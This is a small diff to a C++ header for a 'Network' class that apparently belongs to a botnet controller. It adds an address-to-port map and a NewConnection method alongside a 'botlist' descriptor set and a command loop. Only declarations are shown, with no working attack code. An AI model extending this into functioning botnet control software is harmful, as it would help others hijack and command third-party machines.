@@ -11,6 +11,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <vector>
+#include <map>
 #include <sys/select.h>
 
 /*
@@ -20,12 +21,12 @@
 class Network {
 
 	private:
-		int						sockfd;
-		int						fd_max;
-		struct sockaddr_in		sockaddr;
-		std::vector<int>		port_list;
-		fd_set					botlist;
-		
+		int							sockfd;
+		int							fd_max;
+		struct sockaddr_in			sockaddr;
+		std::vector<int>			port_list;
+		fd_set						botlist;
+		std::map<std::string, int>	address_port;
 
 	public:
 		Network(int port_number);			// initalize botnet.
@@ -33,7 +34,7 @@ class Network {
 		void ErrorAndExit(std::string);	// print error message and exit
 		void ZeroBotlist(void);
 		void CommandLoop(void);
-
+		void NewConnection(void);
 };
 
 
